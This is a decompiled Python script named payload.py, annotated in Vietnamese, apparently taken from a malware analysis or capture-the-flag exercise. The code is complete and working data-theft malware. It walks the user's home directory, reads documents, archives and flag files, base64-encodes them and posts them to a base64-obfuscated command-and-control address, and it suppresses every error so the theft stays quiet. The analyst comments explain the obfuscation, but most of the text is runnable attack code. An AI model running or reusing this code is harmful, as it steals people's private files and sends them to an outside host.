# uncompyle6 version 3.9.1
# Python bytecode 3.10 (3439)
# Decompiled from: Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
# Embedded file name: payload.py
# Compiled at: 2025-04-07 01:12:54
# Size of source mod 2**32: 1102 bytes
import requests, base64, os

def generate_expression(length):
    """Hàm này có vẻ tạo một chuỗi ngẫu nhiên, nhưng thực chất trả về một URL cố định."""
    # Phân tích: Các thao tác chr, ord, len dường như không liên quan đến việc tạo URL thực sự.
    # Giá trị trả về là một chuỗi base64 được hardcode sẵn.
    # Có vẻ đây là một kỹ thuật làm rối đơn giản.
    expression = ''.join([chr(ord(a) ^ ord(b)) for a, b in zip('UIugioepxhWnwGIKOK', 'key_for_c2server')]) # Phần zip này không ảnh hưởng kết quả cuối
    return base64.b64decode('aHR0cDovLzE5NS4xNjguMTEyLjQ6NzA1MS91cGxvYWQ=').decode() # URL thực sự là đây

# URL của C2 server để upload file (sau khi giải mã base64)
# 'aHR0cDovLzE5NS4xNjguMTEyLjQ6NzA1MS91cGxvYWQ=' giải mã thành 'http://195.168.112.4:7051/upload'
TARGET_URL = generate_expression(10) # Gọi hàm làm rối ở trên

# Các đuôi file cần tìm kiếm
FILE_EXTENSIONS = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.flag', '.ctf']

# Thư mục gốc để bắt đầu tìm kiếm (Thư mục home của người dùng)
SEARCH_ROOT = os.path.expanduser('~')

def find_and_upload_files(root_dir, extensions):
    """Tìm file theo đuôi mở rộng và upload lên URL đích."""
    for root, dirs, files in os.walk(root_dir):
        # Bỏ qua các thư mục ẩn hoặc các thư mục hệ thống phổ biến để tránh quét quá sâu/không cần thiết
        dirs[:] = [d for d in dirs if not d.startswith('.') if d.lower() not in ('windows', 'program files', 'program files (x86)', 'appdata')]

        for filename in files:
            # Kiểm tra nếu file có đuôi nằm trong danh sách cần tìm
            if any(filename.lower().endswith(ext) for ext in extensions):
                full_path = os.path.join(root, filename)
                try:
                    # Mở file ở chế độ đọc nhị phân ('rb')
                    with open(full_path, 'rb') as (f):
                        file_data = f.read()

                    # Mã hóa Base64 dữ liệu file
                    encoded_data = base64.b64encode(file_data).decode('utf-8')

                    # Chuẩn bị dữ liệu payload để gửi đi
                    payload = {'filename': filename, 'data': encoded_data}

                    try:
                        # Gửi dữ liệu bằng phương thức POST
                        response = requests.post(TARGET_URL, data=payload, timeout=15) # Đặt timeout để tránh treo
                        # Có thể thêm log hoặc xử lý response ở đây nếu cần
                        # print(f"Uploaded {filename}, status: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        # Ghi lại lỗi mạng nhưng tiếp tục chạy
                        # print(f"Error uploading {filename}: {e}")
                        pass # Bỏ qua lỗi mạng và tiếp tục

                except (IOError, OSError) as e:
                    # Ghi lại lỗi đọc file nhưng tiếp tục chạy
                    # print(f"Error reading file {full_path}: {e}")
                    pass # Bỏ qua lỗi đọc file và tiếp tục

if __name__ == '__main__':
    try:
        find_and_upload_files(SEARCH_ROOT, FILE_EXTENSIONS)
    except Exception as e:
        # Bắt các lỗi không mong muốn khác
        # print(f"An unexpected error occurred: {e}")
        pass